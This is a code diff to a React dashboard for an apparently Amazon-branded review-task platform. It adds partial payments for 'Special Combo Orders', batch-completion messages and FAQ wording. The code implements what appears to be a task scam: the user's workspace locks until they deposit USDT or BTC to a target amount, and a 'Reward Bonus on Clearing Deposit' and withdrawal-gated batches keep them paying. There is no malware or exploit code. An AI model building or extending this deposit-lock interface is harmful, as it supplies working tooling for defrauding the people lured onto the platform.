@@ -67,6 +67,8 @@ interface PlatformStats {
     position: number;
     triggerBalance: number;
     profitAmount: number;
+    depositedAmount?: number;
+    remainingAmount?: number;
   } | null;
   orders: OrderRecord[];
 }
@@ -149,6 +151,7 @@ export default function DashboardPage({
   const [isSavingSettings, setIsSavingSettings] = useState(false);
   const [isComboSuccessModalOpen, setIsComboSuccessModalOpen] = useState(false);
   const [comboSuccessDetails, setComboSuccessDetails] = useState<{ position: number; payout: number; checkpointAmount: number; profitBonus: number } | null>(null);
+  const [lastClearedPosShown, setLastClearedPosShown] = useState<string | null>(null);
 
   // Deposit Request and VIP Unlock States
   const [depositRequests, setDepositRequests] = useState<DepositRequest[]>([]);
@@ -420,8 +423,14 @@ export default function DashboardPage({
         const activePlatData = activePlat ? userData.balances?.[activePlat] : null;
         if (activePlatData?.comboDetails?.isCleared) {
           const comboPos = activePlatData.comboDetails.position;
-          const shownKey = `combo_cleared_shown_${userData.id}_${activePlat}_${comboPos}`;
-          if (!localStorage.getItem(shownKey)) {
+          const posKey = `${activePlat}_${comboPos}`;
+          const dismissKey1 = `combo_cleared_dismissed_${activePlat}_${comboPos}`;
+          const dismissKey2 = `combo_cleared_dismissed_${userData.id}_${activePlat}_${comboPos}`;
+          const dismissKey3 = `combo_cleared_dismissed_${username}_${activePlat}_${comboPos}`;
+
+          const isDismissed = localStorage.getItem(dismissKey1) || localStorage.getItem(dismissKey2) || localStorage.getItem(dismissKey3);
+
+          if (!isDismissed && lastClearedPosShown !== posKey) {
             setComboSuccessDetails({
               position: comboPos,
               checkpointAmount: activePlatData.comboDetails.triggerBalance,
@@ -429,7 +438,7 @@ export default function DashboardPage({
               payout: activePlatData.comboDetails.triggerBalance + activePlatData.comboDetails.profitAmount
             });
             setIsComboSuccessModalOpen(true);
-            localStorage.setItem(shownKey, 'true');
+            setLastClearedPosShown(posKey);
           }
         }
       }
@@ -689,10 +698,10 @@ export default function DashboardPage({
       let wsProto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
       let wsHost = 'localhost:5000';
 
-      // Direct connection to Render backend when deployed on cloud domain (Vercel proxies don't support WS upgrade)
+      // Dynamic WebSocket host resolution (proxied to localhost:5000 in dev, or current host in production)
       if (typeof window !== 'undefined' && window.location.hostname !== 'localhost' && window.location.hostname !== '127.0.0.1') {
-        wsProto = 'wss:';
-        wsHost = 'amazon-backend-pvqm.onrender.com';
+        wsProto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        wsHost = window.location.host;
       } else if (typeof window !== 'undefined' && window.location.port === '3000') {
         wsHost = 'localhost:5000';
       }
@@ -810,7 +819,7 @@ export default function DashboardPage({
                   .then(data => {
                     if (Array.isArray(data)) setChatMessages(data);
                   })
-                  .catch(() => {});
+                  .catch(() => { });
               }
               showToast(`💬 New message from support: ${message.data?.text || ''}`);
             } else {
@@ -1000,7 +1009,10 @@ export default function DashboardPage({
     profitAmount: number;
     currentBalance: number;
     position: number;
+    depositedAmount?: number;
+    remainingAmount?: number;
   } | null>(null);
+  const [comboDepositMode, setComboDepositMode] = useState<'full' | 'partial'>('full');
 
   // Interactive settings and help tabs states
   const [settingsSubTab, setSettingsSubTab] = useState<'account' | 'notifications' | 'wallet' | 'danger'>('account');
@@ -1301,11 +1313,17 @@ export default function DashboardPage({
   // Progress tracker functions
   const startReviewFlow = (product: AssignedProduct) => {
     if (currentPlatformData.isComboBlocked && currentPlatformData.comboDetails) {
+      const cd = currentPlatformData.comboDetails;
+      const comboTarget = cd.triggerBalance || 0;
+      const paidSoFar = cd.depositedAmount || 0;
+      const rem = cd.remainingAmount !== undefined && cd.remainingAmount > 0 ? cd.remainingAmount : Math.max(0, comboTarget - paidSoFar);
       setComboModalDetails({
-        triggerBalance: currentPlatformData.comboDetails.triggerBalance,
-        profitAmount: currentPlatformData.comboDetails.profitAmount,
+        triggerBalance: comboTarget,
+        profitAmount: cd.profitAmount,
         currentBalance: currentPlatformData.walletBalance,
-        position: currentPlatformData.comboDetails.position
+        position: cd.position,
+        depositedAmount: paidSoFar,
+        remainingAmount: rem
       });
       setIsComboModalOpen(true);
       showToast("⚠️ Special Combo Order is locked! Please complete payment to continue.");
@@ -1375,7 +1393,9 @@ export default function DashboardPage({
             triggerBalance: data.triggerBalance || 0,
             profitAmount: data.profitAmount || 0,
             currentBalance: data.currentBalance || 0,
-            position: data.position || 0
+            position: data.position || 0,
+            depositedAmount: data.depositedAmount || 0,
+            remainingAmount: data.remainingAmount !== undefined ? data.remainingAmount : (data.triggerBalance || 0)
           });
           setIsComboModalOpen(true);
           return;
@@ -1396,7 +1416,7 @@ export default function DashboardPage({
           setReviewStars(0);
           setSelectedTextCode(null);
           setIsSubmittingReview(false);
-          fetchAllData().catch(() => {});
+          fetchAllData().catch(() => { });
           return;
         }
         showToast(data.error || 'Submission failed');
@@ -1404,7 +1424,7 @@ export default function DashboardPage({
       }
 
       const actualPayout = data.payoutEarned !== undefined ? data.payoutEarned : activeReviewProduct.payout;
-      
+
       // Optimistically update completedOrders and walletBalance immediately from server response
       const activePlat = activePlatform || enabledPlatform || 'Amazon';
       if (data.completedReviewsCount !== undefined || data.walletBalance !== undefined) {
@@ -1455,7 +1475,9 @@ export default function DashboardPage({
           triggerBalance: data.nextComboDetails.triggerBalance,
           profitAmount: data.nextComboDetails.profitAmount,
           currentBalance: data.nextComboDetails.currentBalance || 0,
-          position: data.nextComboDetails.position
+          position: data.nextComboDetails.position,
+          depositedAmount: data.nextComboDetails.depositedAmount || 0,
+          remainingAmount: data.nextComboDetails.remainingAmount !== undefined ? data.nextComboDetails.remainingAmount : data.nextComboDetails.triggerBalance
         });
         setIsComboModalOpen(true);
         showToast("⚠️ Special Combo Order triggered! Please complete the payment to continue.");
@@ -1476,12 +1498,15 @@ export default function DashboardPage({
       });
 
       const nextProduct = remainingPending[0] || null;
-      if (nextProduct) {
+      const isBatchFinished = (currentPlatformData.completedOrders + 1) >= (assignedProducts.length || 25);
+
+      if (nextProduct && !isBatchFinished) {
         setActiveReviewProduct(nextProduct);
         setReviewStep(1);
       } else {
         setActiveReviewProduct(null);
-        showToast("✓ All assigned campaigns for today have been completed!");
+        setOrdersSubTab('completed');
+        showToast("🎉 Congratulations! All 25 assigned tasks for today have been completed!");
       }
 
       setIsSubmittingReview(false);
@@ -1550,11 +1575,39 @@ export default function DashboardPage({
     }
   };
 
+  // Auto-sync deposit amount input for combo payment modes
+  useEffect(() => {
+    if ((isComboDeposit || currentPlatformData.isComboBlocked) && currentPlatformData.comboDetails) {
+      const cd = currentPlatformData.comboDetails;
+      const comboTarget = cd.triggerBalance || comboDepositAmount || 0;
+      const remainingNeeded = cd.remainingAmount !== undefined && cd.remainingAmount > 0
+        ? cd.remainingAmount
+        : Math.max(0, comboTarget - (cd.depositedAmount || 0));
+
+      if (comboDepositMode === 'full') {
+        setNewDepositAmount(remainingNeeded.toString());
+      }
+    }
+  }, [activeTab, comboDepositMode, isComboDeposit, currentPlatformData.isComboBlocked, currentPlatformData.comboDetails, comboDepositAmount]);
+
   // Submit deposit request
   const handleDepositSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (isSubmittingDeposit) return;
-    const amount = parseFloat(newDepositAmount);
+
+    let amount = parseFloat(newDepositAmount);
+    // If Special Combo block is active and full remaining mode is selected, enforce exact remaining balance needed
+    if ((isComboDeposit || currentPlatformData.isComboBlocked) && currentPlatformData.comboDetails && comboDepositMode === 'full') {
+      const cd = currentPlatformData.comboDetails;
+      const comboTarget = cd.triggerBalance || comboDepositAmount || 0;
+      const remainingNeeded = cd.remainingAmount !== undefined && cd.remainingAmount > 0
+        ? cd.remainingAmount
+        : Math.max(0, comboTarget - (cd.depositedAmount || 0));
+      if (remainingNeeded > 0) {
+        amount = remainingNeeded;
+      }
+    }
+
     if (isNaN(amount) || amount <= 0) {
       showToast("Please enter a valid deposit amount.");
       return;
@@ -2253,7 +2306,7 @@ export default function DashboardPage({
                     <div className="absolute bottom-0 left-0 opacity-[0.03] pointer-events-none transform -translate-x-12 translate-y-12">
                       <Globe className="w-64 h-64 text-gray-900" />
                     </div>
-                    
+
                     <div className="relative z-10 space-y-4">
                       <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 border-b border-gray-100 pb-3">
                         <div className="space-y-1 text-left">
@@ -2413,7 +2466,7 @@ export default function DashboardPage({
                   </div>
                 </div>
 
-                <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
+                <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
                   {/* Left part: New Deposit form */}
                   <div className="lg:col-span-7 bg-white rounded-xl border border-gray-200 p-6 space-y-6 shadow-xs">
                     <div>
@@ -2512,39 +2565,71 @@ export default function DashboardPage({
 
                     {/* Deposit details form inputs */}
                     <form onSubmit={handleDepositSubmit} className="space-y-4">
-                      {/* Special Combo Payment lock alert banner */}
-                      {isComboDeposit && (
-                        <div className="bg-red-50 border border-red-200 rounded-xl p-4 flex items-start space-x-3 text-red-800 animate-fadeIn">
-                          <ShieldAlert className="h-5 w-5 flex-shrink-0 mt-0.5 text-red-600" />
-                          <div className="text-xs leading-relaxed font-medium">
-                            <strong className="text-red-900 font-bold">Special Combo Deposit Lock Active</strong>
-                            <p className="mt-0.5 text-red-700">
-                              {selectedProtocol === 'BTC'
-                                ? <>Deposit approximately <strong className="font-mono">${comboDepositAmount || newDepositAmount}</strong> USD worth of BTC to satisfy the micro-campaign criteria. Enter the BTC amount matching this USD value.</>
-                                : <>You are executing a locked deposit request of <strong className="font-mono">${newDepositAmount}</strong> to satisfy the micro-campaign criteria. This field is locked.</>
-                              }
-                            </p>
+                      {/* Payment Mode Selector Dropdown when Combo is active */}
+                      {(isComboDeposit || (currentPlatformData.isComboBlocked && !!currentPlatformData.comboDetails)) && (() => {
+                        const cd = currentPlatformData.comboDetails;
+                        const comboTarget = cd?.triggerBalance || comboDepositAmount || 0;
+                        const remainingNeeded = cd?.remainingAmount !== undefined && cd?.remainingAmount > 0
+                          ? cd.remainingAmount
+                          : Math.max(0, comboTarget - (cd?.depositedAmount || 0));
+                        const paidForThisCombo = Math.max(0, comboTarget - remainingNeeded);
+
+                        return (
+                          <div className="space-y-1 bg-gray-50 p-3 rounded-xl border border-gray-200">
+                            <label className="text-[10px] text-gray-700 uppercase font-black flex items-center justify-between">
+                              <span>Select Payment Option</span>
+                              {paidForThisCombo > 0 && (
+                                <span className="text-emerald-700 text-[9px] font-mono">Partial Payment Active (Paid ${paidForThisCombo.toFixed(2)})</span>
+                              )}
+                            </label>
+                            <select
+                              value={comboDepositMode}
+                              onChange={(e) => {
+                                const mode = e.target.value as 'full' | 'partial';
+                                setComboDepositMode(mode);
+                                if (mode === 'full') {
+                                  setNewDepositAmount(remainingNeeded.toString());
+                                }
+                              }}
+                              className="w-full px-3 py-2.5 text-xs border border-gray-300 rounded-lg bg-white text-gray-900 font-bold focus:outline-none focus:ring-1 focus:ring-amazon-gold cursor-pointer shadow-xxs"
+                            >
+                              <option value="full">
+                                {paidForThisCombo > 0
+                                  ? `Pay Full Remaining ($${remainingNeeded.toFixed(2)} USD) - Locked`
+                                  : `Full Payment ($${comboTarget.toFixed(2)} USD) - Locked`}
+                              </option>
+                              <option value="partial">Custom Partial Payment (Pay smaller amount)</option>
+                            </select>
                           </div>
-                        </div>
-                      )}
+                        );
+                      })()}
 
                       <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                         <div className="space-y-1">
                           <label className="text-[10px] text-gray-505 uppercase font-black">
                             Amount ({selectedProtocol === 'BTC' ? 'BTC' : 'USDT'})
-                            {isComboDeposit && selectedProtocol !== 'BTC' && <span className="text-red-600 font-bold ml-1.5">(Locked)</span>}
-                            {isComboDeposit && selectedProtocol === 'BTC' && <span className="text-amber-600 font-bold ml-1.5">(≈${comboDepositAmount || newDepositAmount} USD)</span>}
+                            {(isComboDeposit || currentPlatformData.isComboBlocked) && (() => {
+                              const cd = currentPlatformData.comboDetails;
+                              const comboTarget = cd?.triggerBalance || comboDepositAmount || 0;
+                              const remainingNeeded = cd?.remainingAmount !== undefined && cd?.remainingAmount > 0
+                                ? cd.remainingAmount
+                                : Math.max(0, comboTarget - (cd?.depositedAmount || 0));
+                              return (
+                                <span className="text-amber-600 font-bold ml-1.5">
+                                </span>
+                              );
+                            })()}
                           </label>
                           <input
                             type="number"
                             step="any"
                             required
-                            disabled={isComboDeposit && selectedProtocol !== 'BTC'}
-                            readOnly={isComboDeposit && selectedProtocol !== 'BTC'}
-                            placeholder={isComboDeposit && selectedProtocol === 'BTC' ? `e.g. ${(parseFloat(comboDepositAmount || newDepositAmount || '10') / 70000).toFixed(6)}` : "Enter amount (e.g. 20.00)"}
+                            disabled={(isComboDeposit || currentPlatformData.isComboBlocked) && comboDepositMode === 'full' && selectedProtocol !== 'BTC'}
+                            readOnly={(isComboDeposit || currentPlatformData.isComboBlocked) && comboDepositMode === 'full' && selectedProtocol !== 'BTC'}
+                            placeholder={selectedProtocol === 'BTC' ? `e.g. ${(parseFloat(newDepositAmount || '10') / 70000).toFixed(6)}` : "Enter amount (e.g. 20.00)"}
                             value={newDepositAmount}
                             onChange={(e) => setNewDepositAmount(e.target.value)}
-                            className={`w-full px-3 py-2 text-xs border border-gray-300 rounded-lg focus:outline-none focus:ring-1 focus:ring-amazon-gold font-medium text-gray-800 ${isComboDeposit && selectedProtocol !== 'BTC' ? 'bg-gray-100 cursor-not-allowed opacity-80' : ''}
+                            className={`w-full px-3 py-2 text-xs border border-gray-300 rounded-lg focus:outline-none focus:ring-1 focus:ring-amazon-gold font-medium text-gray-800 font-mono font-bold ${(isComboDeposit || currentPlatformData.isComboBlocked) && comboDepositMode === 'full' && selectedProtocol !== 'BTC' ? 'bg-gray-100 cursor-not-allowed opacity-80' : 'bg-white'
                               }`}
                           />
                         </div>
@@ -2563,15 +2648,14 @@ export default function DashboardPage({
 
                       <div className="space-y-1">
                         <label className="text-[10px] text-gray-505 uppercase font-black">
-                          {isComboDeposit ? 'Combo Payment Identifier (Locked)' : 'Remark (optional)'}
+                          {isComboDeposit ? 'Combo Payment Identifier' : 'Remark (optional)'}
                         </label>
                         <input
                           type="text"
-                          placeholder={isComboDeposit ? "Auto-assigned combo identifier" : "Add a note or sender wallet details..."}
+                          placeholder={isComboDeposit ? "Combo identifier" : "Add a note or sender wallet details..."}
                           value={newDepositRemark}
                           onChange={(e) => setNewDepositRemark(e.target.value)}
-                          disabled={isComboDeposit}
-                          className={`w-full px-3 py-2 text-xs border border-gray-300 rounded-lg focus:outline-none focus:ring-1 focus:ring-amazon-gold font-medium text-gray-800 ${isComboDeposit ? 'bg-gray-100 cursor-not-allowed opacity-80' : ''}`}
+                          className="w-full px-3 py-2 text-xs border border-gray-300 rounded-lg focus:outline-none focus:ring-1 focus:ring-amazon-gold font-medium text-gray-800"
                         />
                       </div>
 
@@ -2595,54 +2679,109 @@ export default function DashboardPage({
                     </form>
                   </div>
 
-                  {/* Right part: Recent Deposit Requests history with simulation approval triggers */}
-                  <div className="lg:col-span-5 bg-white rounded-xl border border-gray-200 p-5 shadow-xs flex flex-col space-y-4">
+                  {/* Right part: Recent Deposit Requests history */}
+                  <div className="lg:col-span-5 bg-white rounded-xl border border-gray-200 p-5 shadow-xs flex flex-col space-y-3">
                     <div>
                       <h3 className="text-sm font-black text-gray-900 uppercase tracking-wide">Recent deposit requests</h3>
                       <p className="text-xs text-gray-400 mt-0.5 font-sans">Check and validate your pending crypto transfers.</p>
                     </div>
 
-                    <div className="flex-1 overflow-y-auto space-y-3.5 pt-2">
-                      {depositRequests.map((req) => (
-                        <div key={req.id} className="border border-gray-150 p-4.5 rounded-xl bg-gray-50/50 space-y-3 text-xs">
-                          <div className="flex justify-between items-center border-b border-gray-150 pb-2">
-                            <span className="font-bold text-gray-855">{req.protocol} Network</span>
-                            <span className={`px-2 py-0.5 text-[9px] font-black uppercase rounded border ${req.status === 'Approved' ? 'bg-green-50 text-green-700 border-green-200 font-bold' :
-                              req.status === 'Rejected' ? 'bg-red-50 text-red-700 border-red-200 font-bold' :
-                                'bg-amber-50 text-amber-700 border-amber-200 animate-pulse font-bold'
-                              }`}>
-                              {req.status}
-                            </span>
-                          </div>
-                          <div className="grid grid-cols-2 gap-y-1.5 text-gray-600 font-medium">
-                            <div>Amount:</div>
-                            <div className="text-right font-black font-mono text-gray-900">{'$' + req.amount.toFixed(2) + ' ' + (req.currency || (req.protocol === 'BTC' ? 'BTC' : 'USDT'))}</div>
-                            <div>Hash:</div>
-                            <div className="text-right font-mono text-[10px] text-gray-400 truncate max-w-[120px] ml-auto cursor-pointer" title={req.txHash}>
-                              {req.txHash.length > 12 ? `${req.txHash.slice(0, 6)}...${req.txHash.slice(-6)}` : req.txHash}
+                    <div className="overflow-y-auto space-y-2.5 pr-1 max-h-[540px]">
+                      {deposits.length === 0 ? (
+                        <div className="py-12 text-center text-xs text-gray-400 font-medium">
+                          No deposit requests submitted yet.
+                        </div>
+                      ) : (
+                        deposits.map((dep) => (
+                          <div key={dep.id} className="p-3.5 bg-gray-50 rounded-xl border border-gray-200 space-y-2 text-left">
+                            <div className="flex items-center justify-between">
+                              <span className="font-mono text-xs font-black text-gray-900">+${dep.amount.toFixed(2)} USD</span>
+                              <span className={`text-[9px] font-black uppercase px-2.5 py-0.5 rounded-full border font-mono ${dep.status === 'Approved' ? 'bg-emerald-50 text-emerald-700 border-emerald-200' :
+                                  dep.status === 'Rejected' ? 'bg-red-50 text-red-700 border-red-200' :
+                                    'bg-amber-50 text-amber-700 border-amber-200 animate-pulse'
+                                }`}>
+                                {dep.status}
+                              </span>
                             </div>
-                            {req.remark && (
-                              <>
-                                <div>Remark:</div>
-                                <div className="text-right italic truncate max-w-[120px] ml-auto">{req.remark}</div>
-                              </>
-                            )}
-                            <div>Date:</div>
-                            <div className="text-right font-mono text-gray-500">{req.date}</div>
-                          </div>
-                        </div>
-                      ))}
 
-                      {depositRequests.length === 0 && (
-                        <div className="text-center py-12 text-gray-400">
-                          <Wallet className="h-10 w-10 mx-auto text-gray-300 mb-2" />
-                          <p className="font-bold">No deposit requests yet.</p>
-                          <p className="text-[11px] text-gray-400 mt-0.5">Submit a deposit above to see it here.</p>
-                        </div>
+                            <div className="text-[10px] text-gray-500 font-mono truncate">
+                              TxID: {dep.txHash}
+                            </div>
+
+                            {dep.remark && (
+                              <div className="text-[10px] text-amber-800 bg-amber-50 px-2.5 py-1 rounded-lg border border-amber-200/60 font-medium truncate">
+                                Remark: {dep.remark}
+                              </div>
+                            )}
+
+                            <div className="pt-1.5 border-t border-gray-200 text-[10px] text-gray-400 font-mono">
+                              {dep.date}
+                            </div>
+                          </div>
+                        ))
                       )}
                     </div>
                   </div>
                 </div>
+
+                {/* ================= SEPARATE CLEAN WHITE CARD BELOW DEPOSIT GRID FOR COMBO DETAILS ================= */}
+                {(isComboDeposit || (currentPlatformData.isComboBlocked && !!currentPlatformData.comboDetails)) && (() => {
+                  const cd = currentPlatformData.comboDetails;
+                  const comboTarget = cd?.triggerBalance || comboDepositAmount || 0;
+                  const remainingNeeded = cd?.remainingAmount !== undefined && cd?.remainingAmount > 0
+                    ? cd.remainingAmount
+                    : Math.max(0, comboTarget - (cd?.depositedAmount || 0));
+                  const paidForThisCombo = Math.max(0, comboTarget - remainingNeeded);
+                  const profitBonus = cd?.profitAmount || 0;
+
+                  return (
+                    <div className="bg-white border border-gray-200 shadow-sm rounded-xl p-5 mt-4 text-left space-y-4 animate-fadeIn">
+                      {/* Header */}
+                      <div className="flex items-center justify-between border-b border-gray-100 pb-3">
+                        <div className="flex items-center space-x-2.5">
+                          <div className="h-8 w-8 bg-gray-100 rounded-lg flex items-center justify-center text-gray-900 border border-gray-200">
+                            <ShieldAlert className="h-4 w-4 text-gray-700" />
+                          </div>
+                          <div>
+                            <h4 className="text-xs font-black text-gray-900 uppercase">
+                              Special Combo Order #{cd?.position || 1} Information
+                            </h4>
+                            <p className="text-[10px] text-gray-500 font-medium">
+                              Review workspace is locked until the remaining deposit balance for this combo is cleared.
+                            </p>
+                          </div>
+                        </div>
+                        <span className={`text-[10px] font-bold px-2.5 py-1 rounded-full border font-mono ${paidForThisCombo > 0 ? 'bg-emerald-50 text-emerald-700 border-emerald-200' : 'bg-gray-50 text-gray-700 border-gray-200'}`}>
+                          {paidForThisCombo > 0 ? 'Partial Payment Active' : 'Payment Required'}
+                        </span>
+                      </div>
+
+                      {/* 3-Box Financial Breakdown Grid (Clean White Card Theme) */}
+                      <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-xs">
+                        <div className="bg-gray-50 p-3 rounded-lg border border-gray-200">
+                          <span className="text-[10px] text-gray-500 font-bold uppercase tracking-wider">Combo Target (Order #{cd?.position || 1}):</span>
+                          <p className="font-mono font-black text-gray-900 text-sm mt-0.5">${comboTarget.toFixed(2)} USD</p>
+                        </div>
+                        <div className="bg-gray-50 p-3 rounded-lg border border-gray-200">
+                          <span className="text-[10px] text-emerald-700 font-bold uppercase tracking-wider">Paid for this Combo:</span>
+                          <p className="font-mono font-black text-emerald-600 text-sm mt-0.5">-${paidForThisCombo.toFixed(2)} USD</p>
+                        </div>
+                        <div className="bg-red-50 p-3 rounded-lg border border-red-200">
+                          <span className="text-[10px] text-red-700 font-black uppercase tracking-wider">Remaining Needed:</span>
+                          <p className="font-mono font-black text-red-600 text-sm mt-0.5">${remainingNeeded.toFixed(2)} USD</p>
+                        </div>
+                      </div>
+
+                      {/* Bonus Reward Badge */}
+                      {profitBonus > 0 && (
+                        <div className="flex items-center justify-between text-xs bg-emerald-50 text-emerald-900 px-3.5 py-2.5 rounded-lg border border-emerald-200 font-medium">
+                          <span>🎁 Reward Bonus on Clearing Deposit:</span>
+                          <span className="font-mono font-black text-emerald-700 text-sm">+${profitBonus.toFixed(2)} USD</span>
+                        </div>
+                      )}
+                    </div>
+                  );
+                })()}
               </div>
             )}
 
@@ -2791,7 +2930,7 @@ export default function DashboardPage({
                         <div className="absolute bottom-0 left-0 opacity-[0.03] pointer-events-none transform -translate-x-12 translate-y-12">
                           <Globe className="w-64 h-64 text-gray-900" />
                         </div>
-                        
+
                         <div className="relative z-10 space-y-4">
                           <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2 border-b border-gray-100 pb-3">
                             <div className="space-y-1">
@@ -3021,7 +3160,7 @@ export default function DashboardPage({
                           : 'border-transparent text-gray-400 hover:text-gray-655'
                           }`}
                       >
-                        Pending Tasks
+                        Pending Tasks ({(assignedProducts.length || 25) > currentPlatformData.completedOrders ? (assignedProducts.length || 25) - currentPlatformData.completedOrders : 0})
                       </button>
                       <button
                         onClick={() => {
@@ -3038,37 +3177,50 @@ export default function DashboardPage({
                     </div>
 
                     {currentPlatformData.isComboBlocked && currentPlatformData.comboDetails && (
-                      <div className="bg-amber-50 border border-amber-200 rounded-xl p-4 flex flex-col sm:flex-row items-center justify-between gap-3 text-left animate-pulse mt-4">
-                        <div className="flex items-center space-x-3">
-                          <div className="bg-amber-600 text-white p-2.5 rounded-lg flex-shrink-0">
-                            <ShieldAlert className="h-5 w-5" />
+                      (() => {
+                        const cd = currentPlatformData.comboDetails;
+                        const rem = cd.remainingAmount !== undefined && cd.remainingAmount > 0 ? cd.remainingAmount : cd.triggerBalance;
+                        const dep = cd.depositedAmount || 0;
+                        return (
+                          <div className="bg-amber-50 border border-amber-200 rounded-xl p-4 flex flex-col sm:flex-row items-center justify-between gap-3 text-left animate-pulse mt-4">
+                            <div className="flex items-center space-x-3">
+                              <div className="bg-amber-600 text-white p-2.5 rounded-lg flex-shrink-0">
+                                <ShieldAlert className="h-5 w-5" />
+                              </div>
+                              <div>
+                                <h4 className="text-xs font-black text-amber-900 uppercase">
+                                  Special Combo Order #{cd.position} Triggered!
+                                </h4>
+                                <p className="text-[10px] text-amber-700 font-sans mt-0.5 leading-relaxed">
+                                  {dep > 0 ? (
+                                    <>You have completed a partial deposit of <strong>${dep.toFixed(2)} USD</strong>. Please complete the remaining deposit of <strong className="text-red-650 font-black">${rem.toFixed(2)} USD</strong> to unlock your workspace.</>
+                                  ) : (
+                                    <>You have triggered a high-yield Special Combo order. Please complete the deposit of <strong className="text-red-650 font-black">${rem.toFixed(2)} USD</strong> to unlock this workspace and continue.</>
+                                  )}
+                                </p>
+                              </div>
+                            </div>
+                            <button
+                              onClick={() => {
+                                if (currentPlatformData.comboDetails) {
+                                  setComboModalDetails({
+                                    triggerBalance: cd.triggerBalance,
+                                    profitAmount: cd.profitAmount,
+                                    currentBalance: currentPlatformData.walletBalance,
+                                    position: cd.position,
+                                    depositedAmount: cd.depositedAmount,
+                                    remainingAmount: cd.remainingAmount
+                                  });
+                                  setIsComboModalOpen(true);
+                                }
+                              }}
+                              className="bg-amber-600 hover:bg-amber-700 text-white text-[10px] font-black uppercase px-4 py-2 rounded-lg transition whitespace-nowrap self-end sm:self-center cursor-pointer font-sans"
+                            >
+                              View Combo Invoice
+                            </button>
                           </div>
-                          <div>
-                            <h4 className="text-xs font-black text-amber-900 uppercase">
-                              Special Combo Order #{currentPlatformData.comboDetails.position} Triggered!
-                            </h4>
-                            <p className="text-[10px] text-amber-700 font-sans mt-0.5 leading-relaxed">
-                              You have triggered a high-yield Special Combo order. Please complete the deposit of <strong>${currentPlatformData.comboDetails.triggerBalance.toFixed(2)} USD</strong> to unlock this workspace and continue.
-                            </p>
-                          </div>
-                        </div>
-                        <button
-                          onClick={() => {
-                            if (currentPlatformData.comboDetails) {
-                              setComboModalDetails({
-                                triggerBalance: currentPlatformData.comboDetails.triggerBalance,
-                                profitAmount: currentPlatformData.comboDetails.profitAmount,
-                                currentBalance: currentPlatformData.walletBalance,
-                                position: currentPlatformData.comboDetails.position
-                              });
-                              setIsComboModalOpen(true);
-                            }
-                          }}
-                          className="bg-amber-600 hover:bg-amber-700 text-white text-[10px] font-black uppercase px-4 py-2 rounded-lg transition whitespace-nowrap self-end sm:self-center cursor-pointer font-sans"
-                        >
-                          View Combo Invoice
-                        </button>
-                      </div>
+                        );
+                      })()
                     )}
 
                     {/* Search and Filters Bar */}
@@ -3179,10 +3331,10 @@ export default function DashboardPage({
                                   ? "Wait for the administrator to assign campaign products."
                                   : ordersSubTab === 'pending'
                                     ? (currentPlatformData.completedOrders >= assignedProducts.length
-                                        ? (withdrawals.some((w: any) => w.status === 'Approved')
-                                            ? `All ${assignedProducts.length}/${assignedProducts.length} orders completed. Waiting for admin to assign new orders.`
-                                            : `All ${assignedProducts.length}/${assignedProducts.length} orders completed. You must complete a withdrawal before the admin can assign your next batch.`)
-                                        : "Check back later or wait for administrators to unlock new batches.")
+                                      ? (withdrawals.some((w: any) => w.status === 'Approved')
+                                        ? `All ${assignedProducts.length}/${assignedProducts.length} orders completed. Waiting for admin to assign new orders.`
+                                        : `All ${assignedProducts.length}/${assignedProducts.length} orders completed. You must complete a withdrawal before the admin can assign your next batch.`)
+                                      : "Check back later or wait for administrators to unlock new batches.")
                                     : "Select pending campaigns to complete evaluation compliance tasks."}
                               </p>
                               {ordersSubTab === 'pending' && assignedProducts.length > 0 && currentPlatformData.completedOrders >= assignedProducts.length && !withdrawals.some((w: any) => w.status === 'Approved') && (
@@ -4829,8 +4981,8 @@ export default function DashboardPage({
                     },
                     {
                       id: 5,
-                      q: "Why can I not start a new batch immediately after completing 25 orders?",
-                      a: "To maintain system integrity, a 24-hour cooldown period starts as soon as your withdrawal request is approved by the administrator. The platform will unlock the next campaign pool automatically once this timer expires."
+                      q: "When can I start my next review batch after completing 25 orders?",
+                      a: "Once your administrator resets the batch or assigns new products, you can immediately begin your next review batch without any waiting period."
                     },
                     {
                       id: 6,
@@ -5047,7 +5199,7 @@ export default function DashboardPage({
                   <div className="pt-1 flex-shrink-0">
                     <button
                       type="submit"
-                      disabled={reviewStars === 0 || selectedTextCode === null || isSubmittingReview || currentPlatformData.completedOrders >= assignedProducts.length}
+                      disabled={reviewStars === 0 || selectedTextCode === null || isSubmittingReview || (assignedProducts.length > 0 && currentPlatformData.completedOrders >= assignedProducts.length)}
                       className="w-full py-2.5 bg-amazon-gold hover:bg-[#e2b600] disabled:bg-gray-100 disabled:text-gray-400 disabled:border-gray-200 border-0 text-amazon-dark disabled:cursor-not-allowed font-black text-xs rounded-lg transition-colors cursor-pointer text-center uppercase tracking-wider flex items-center justify-center space-x-2"
                     >
                       {isSubmittingReview ? (
@@ -5057,9 +5209,9 @@ export default function DashboardPage({
                         </>
                       ) : (
                         <>
-                          <span>Submit and Open Next Order</span>
+                          <span>{assignedProducts.length > 0 && currentPlatformData.completedOrders >= assignedProducts.length ? "All Orders Completed" : "Submit and Open Next Order"}</span>
                           <span className="bg-amazon-dark/10 px-2 py-0.5 rounded text-[10px] font-mono">
-                            {currentPlatformData.completedOrders + 1}/{assignedProducts.length}
+                            {Math.min(currentPlatformData.completedOrders + 1, assignedProducts.length || 25)}/{assignedProducts.length || 25}
                           </span>
                         </>
                       )}
@@ -5203,35 +5355,60 @@ export default function DashboardPage({
                 </p>
               </div>
 
-              <div className="bg-amber-50/70 border border-amber-200 rounded-xl p-4 space-y-3 text-xs">
-                {/* Top: Position / Product Details */}
-                <div className="flex justify-between items-center pb-2 border-b border-amber-200/50">
-                  <span className="text-gray-655 font-bold">Combo Target:</span>
-                  <span className="font-mono font-black text-gray-900 uppercase">Order #{comboModalDetails.position}</span>
-                </div>
-                {/* Middle: Combo Profit */}
-                <div className="flex justify-between items-center pb-2 border-b border-amber-200/50">
-                  <span className="text-gray-655 font-bold text-green-700 font-sans">Combo Profit Bonus:</span>
-                  <span className="font-mono font-black text-green-700 font-bold">+${comboModalDetails.profitAmount.toFixed(2)}</span>
-                </div>
-                {/* Bottom: Available Balance */}
